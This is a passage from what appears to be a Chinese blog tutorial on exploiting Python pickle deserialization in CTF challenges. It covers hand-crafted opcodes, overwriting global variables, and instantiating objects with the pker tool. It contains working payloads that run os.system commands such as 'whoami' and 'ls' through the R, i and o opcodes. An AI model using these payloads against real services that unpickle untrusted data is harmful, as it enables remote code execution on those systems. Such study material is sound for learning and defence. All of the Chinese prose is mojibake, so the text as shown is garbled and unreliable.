è¡¨ç¤ºï¼š <code>b&#39;I01\n&#39;</code> ï¼› <code>FALSE</code> ä¹Ÿå¯ä»¥ç”¨ <code>I</code> è¡¨ç¤ºï¼š <code>b&#39;I00\n&#39;</code> ï¼Œå…¶ä»–opcodeå¯ä»¥åœ¨<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickleåº“çš„æºä»£ç </a>ä¸­æ‰¾åˆ°ã€‚</p><p>ç”¨è¿™äº›opcodeæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€äº›éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p><ul><li>ç¼–å†™opcodeæ—¶è¦æƒ³è±¡æ ˆä¸­çš„æ•°æ®ï¼Œä»¥æ­£ç¡®ä½¿ç”¨æ¯ç§opcodeã€‚</li><li>åœ¨ç†è§£æ—¶æ³¨æ„ä¸pythonæœ¬èº«çš„æ“ä½œå¯¹ç…§ï¼ˆæ¯”å¦‚pythonåˆ—è¡¨çš„<code>append</code>å¯¹åº”<code>a</code>ã€<code>extend</code>å¯¹åº”<code>e</code>ï¼›å­—å…¸çš„<code>update</code>å¯¹åº”<code>u</code>ï¼‰ã€‚</li><li><code>c</code>æ“ä½œç¬¦ä¼šå°è¯•<code>import</code>åº“ï¼Œæ‰€ä»¥åœ¨<code>pickle.loads</code>æ—¶ä¸éœ€è¦æ¼æ´ä»£ç ä¸­å…ˆå¼•å…¥ç³»ç»Ÿåº“ã€‚</li><li>pickleä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸º<strong>å·¦å€¼</strong>ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚<code>getattr</code>ã€<code>dict.get</code>ï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨<code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦ï¼Œ<strong>ä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„</strong>ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚pickleèƒ½å¤Ÿç´¢å¼•æŸ¥å€¼çš„æ“ä½œåªæœ‰<code>c</code>ã€<code>i</code>ã€‚è€Œå¦‚ä½•æŸ¥å€¼ä¹Ÿæ˜¯CTFçš„ä¸€ä¸ªé‡è¦è€ƒç‚¹ã€‚</li><li><code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦å¯ä»¥æ„é€ å¹¶èµ‹å€¼åŸæ¥æ²¡æœ‰çš„å±æ€§ã€é”®å€¼å¯¹ã€‚</li></ul><h4 id="æ‹¼æ¥opcode"><a href="#æ‹¼æ¥opcode" class="headerlink" title="æ‹¼æ¥opcode"></a>æ‹¼æ¥opcode</h4><p>å°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„ <code>.</code> å»æ‰ï¼Œå°†ç¬¬äºŒä¸ªpickleæµä¸ç¬¬ä¸€ä¸ªæ‹¼æ¥èµ·æ¥å³å¯ã€‚</p><h4 id="å…¨å±€å˜é‡è¦†ç›–"><a href="#å…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="å…¨å±€å˜é‡è¦†ç›–"></a>å…¨å±€å˜é‡è¦†ç›–</h4><p>pythonæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># secret.py</span><br>name=<span class="hljs-string">&#x27;TEST3213qkfsmfo&#x27;</span><br><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret.name)<br><br>output=pickle.loads(opcode.encode())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,secret.name)<br></code></pre></td></tr></table></figure><p>è¿™æ®µå­—èŠ‚ç çš„å«ä¹‰æ˜¯ï¼š</p><ol><li><code>c__main__\nsecret\n</code>ï¼š<ul><li>ä» <code>__main__</code> æ¨¡å—ä¸­è·å– <code>secret</code> å¯¹è±¡ã€‚</li></ul></li><li><code>(S&#39;name&#39;\nS&#39;1&#39;\ndb.</code>ï¼š<ul><li>åˆ›å»ºä¸€ä¸ªå­—å…¸ <code>&#123;&#39;name&#39;: &#39;1&#39;&#125;</code>ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™ <code>secret</code> å¯¹è±¡çš„ <code>__dict__</code> å±æ€§ã€‚</li></ul></li></ol><p>ä½¿ç”¨åˆ°çš„payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="å‡½æ•°æ‰§è¡Œ"><a href="#å‡½æ•°æ‰§è¡Œ" class="headerlink" title="å‡½æ•°æ‰§è¡Œ"></a>å‡½æ•°æ‰§è¡Œ</h4><p>ä¸å‡½æ•°æ‰§è¡Œç›¸å…³çš„opcodeæœ‰ä¸‰ä¸ªï¼š <code>R</code> ã€ <code>i</code> ã€ <code>o</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»ä¸‰ä¸ªæ–¹å‘è¿›è¡Œæ„é€ ï¼š</p><ol><li><code>R</code> ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">cosï¼š</span><br><span class="hljs-string">ä» os æ¨¡å—ä¸­è·å– system å‡½æ•°ã€‚</span><br><span class="hljs-string">systemï¼š</span><br><span class="hljs-string">è°ƒç”¨ os.system å‡½æ•°ã€‚</span><br><span class="hljs-string">(S&#x27;whoami&#x27;ï¼š</span><br><span class="hljs-string">å°†å­—ç¬¦ä¸² &#x27;whoami&#x27; ä½œä¸ºå‚æ•°ä¼ é€’ç»™ os.systemã€‚</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>i</code> ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br>(S<span class="hljs-string">&#x27;whoami&#x27;</span>\nios\nsystem\n.ï¼š<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>ï¼šè¡¨æ˜è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå€¼ä¸º <span class="hljs-string">&#x27;whoami&#x27;</span>ã€‚<br>ios å’Œ systemï¼šæŒ‡å‘ Python æ¨¡å— os çš„ system æ–¹æ³•ã€‚<br>.ï¼šè¡¨ç¤ºåºåˆ—åŒ–ç»“æŸ<br></code></pre></td></tr></table></figure><ol start="3"><li><code>o</code> ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br>(cos\nsystem\nS<span class="hljs-string">&#x27;whoami&#x27;</span>\no.ï¼š<br>cï¼šè¡¨ç¤ºå¼•ç”¨ä¸€ä¸ªæ¨¡å—ã€‚<br>osï¼šè¡¨ç¤ºå¯¼å…¥çš„æ¨¡å—æ˜¯ Python çš„æ ‡å‡†åº“ osã€‚<br>systemï¼šå¼•ç”¨äº† os æ¨¡å—ä¸­çš„ system æ–¹æ³•ã€‚<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>ï¼šåºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œå†…å®¹ä¸º <span class="hljs-string">&#x27;whoami&#x27;</span>ã€‚<br>oï¼šè¡¨ç¤ºè°ƒç”¨ï¼ˆå¯¹è±¡åº”ç”¨ï¼‰ï¼Œå°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™ os.system æ–¹æ³•ã€‚<br>.ï¼šè¡¨ç¤ºåºåˆ—åŒ–ç»“æŸã€‚<br></code></pre></td></tr></table></figure><h4 id="å®ä¾‹åŒ–å¯¹è±¡"><a href="#å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="å®ä¾‹åŒ–å¯¹è±¡"></a>å®ä¾‹åŒ–å¯¹è±¡</h4><p>å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼Œè¿™é‡Œç®€å•çš„ä½¿ç”¨ <code>R</code> æ„é€ ä¸€ä¸‹ï¼Œå…¶ä»–æ–¹å¼ç±»ä¼¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a=pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name,a.age)<br><span class="hljs-comment">#åˆ›å»ºäº†studentå¯¹è±¡</span><br></code></pre></td></tr></table></figure><h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ul><li>pkeræ˜¯ç”±@eddieivan01ç¼–å†™çš„ä»¥ä»¿ç…§Pythonçš„å½¢å¼äº§ç”Ÿpickle opcodeçš„è§£æå™¨ï¼Œå¯ä»¥åœ¨<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pkerä¸‹è½½æºç ã€‚</a></li><li>ä½¿ç”¨pkerï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–¹ä¾¿åœ°ç¼–å†™pickle opcodeï¼ˆç”Ÿæˆpickleç‰ˆæœ¬0çš„opcodeï¼‰ã€‚</li><li>å†æ¬¡å»ºè®®ï¼Œåœ¨èƒ½å¤Ÿæ‰‹å†™opcodeçš„æƒ…å†µä¸‹ä½¿ç”¨pkerè¿›è¡Œè¾…åŠ©ç¼–å†™ï¼Œä¸è¦è¿‡åˆ†ä¾èµ–pkerã€‚</li></ul><h2 id="pkerèƒ½åšçš„äº‹"><a href="#pkerèƒ½åšçš„äº‹" class="headerlink" title="pkerèƒ½åšçš„äº‹"></a>pkerèƒ½åšçš„äº‹</h2><blockquote><ul><li>å˜é‡èµ‹å€¼ï¼šå­˜åˆ°memoä¸­ï¼Œä¿å­˜memoä¸‹æ ‡å’Œå˜é‡åå³å¯</li><li>å‡½æ•°è°ƒç”¨</li><li>ç±»å‹å­—é¢é‡æ„é€ </li><li>listå’Œdictæˆå‘˜ä¿®æ”¹</li><li>å¯¹è±¡æˆå‘˜å˜é‡ä¿®æ”¹</li></ul></blockquote><p>å…·ä½“æ¥è®²ï¼Œå¯ä»¥ä½¿ç”¨pkerè¿›è¡ŒåŸå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œã€å®ä¾‹åŒ–æ–°çš„å¯¹è±¡ã€‚</p><h2 id="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"><a href="#ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"></a>ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹</h2><ol><li>pkerä¸­çš„é’ˆå¯¹pickleçš„ç‰¹æ®Šè¯­æ³•éœ€è¦é‡ç‚¹æŒæ¡</li><li>æ­¤å¤–æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼špythonä¸­çš„æ‰€æœ‰ç±»ã€æ¨¡å—ã€åŒ…ã€å±æ€§ç­‰éƒ½æ˜¯å¯¹è±¡ï¼Œè¿™æ ·ä¾¿äºå¯¹å„æ“ä½œè¿›è¡Œç†è§£ã€‚</li><li>pkerä¸»è¦ç”¨åˆ°<code>GLOBALã€INSTã€OBJ</code>ä¸‰ç§ç‰¹æ®Šçš„å‡½æ•°ä»¥åŠä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼Œå…¶ä»–çš„opcodeä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ï¼š</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä»¥ä¸‹<span class="hljs-keyword">module</span>éƒ½å¯ä»¥æ˜¯åŒ…å«`.`çš„å­<span class="hljs-keyword">module</span><br>è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„å‚æ•°ç±»å‹è¦å’Œç¤ºä¾‹ä¸€è‡´<br>å¯¹åº”çš„opcodeä¼šè¢«ç”Ÿæˆï¼Œä½†å¹¶ä¸ä¸pkerä»£ç ç›¸äº’ç­‰ä»·<br><br><span class="hljs-keyword">GLOBAL</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;c&#x27;</span><br>è·å–<span class="hljs-keyword">module</span>ä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼š<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,instance(callableã€<span class="hljs-keyword">module</span>éƒ½æ˜¯instance)  <br><br>INST<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;i&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼š<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;o&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼š<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>è¾“å…¥ï¼šcallable,para<br><br>xxx(xx,...)<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;R&#x27;</span><br>ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ ˆå¹¶è°ƒç”¨ï¼‰<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>æˆ–<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;s&#x27;</span><br>æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;b&#x27;</span><br>å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½®<br><br><span class="hljs-keyword">return</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;0&#x27;</span><br>å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼š<br><span class="hljs-keyword">return</span> xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ol><li>ç”±äºopcodeæœ¬èº«çš„åŠŸèƒ½é—®é¢˜ï¼Œpkerè‚¯å®šä¹Ÿä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸º<strong>å·¦å€¼</strong>ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚<code>getattr</code>ã€<code>dict.get</code>ï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨<code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦ï¼Œ<strong>ä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„</strong>ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚</li><li>pkerè§£æ<code>S</code>æ—¶ï¼Œç”¨å•å¼•å·åŒ…è£¹å­—ç¬¦ä¸²ã€‚æ‰€ä»¥pkerä»£ç ä¸­çš„åŒå¼•å·ä¼šè¢«è§£æä¸ºå•å¼•å·opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>è¢«è§£æä¸ºï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"><a href="#pkerï¼šå…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"></a>pkerï¼šå…¨å±€å˜é‡è¦†ç›–</h4><ul><li>è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥çš„<code>secret</code>æ¨¡å—ä¸­çš„<code>name</code>ä¸<code>category</code>å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># pythonçš„æ‰§è¡Œæ–‡ä»¶è¢«è§£æä¸º__main__å¯¹è±¡ï¼Œsecretåœ¨è¯¥å¯¹è±¡ä»å±ä¸‹</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šç»™å‡ºä¸€äº›å…·ä½“çš„åŸºæœ¬æ“ä½œçš„å®ä¾‹ã€‚</p><h4 id="pkerï¼šå‡½æ•°æ‰§è¡Œ"><a href="#pkerï¼šå‡½æ•°æ‰§è¡Œ" class="headerlink" title="pkerï¼šå‡½æ•°æ‰§è¡Œ"></a>pkerï¼šå‡½æ•°æ‰§è¡Œ</h4><ul><li>é€šè¿‡<code>b&#39;R&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`è°ƒç”¨<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;i&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;c&#39;</code>ä¸<code>b&#39;o&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>å¤šå‚æ•°è°ƒç”¨å‡½æ•°</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"><a href="#pkerï¼šå®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"></a>pkerï¼šå®ä¾‹åŒ–å¯¹è±¡</h4><ul><li>å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œ</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># æˆ–è€…</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>å…¶ä¸­ï¼ŒpythonåŸæ–‡ä»¶ä¸­åŒ…å«ï¼š</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>ä¹Ÿå¯ä»¥å…ˆå®ä¾‹åŒ–å†èµ‹å€¼ï¼š</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 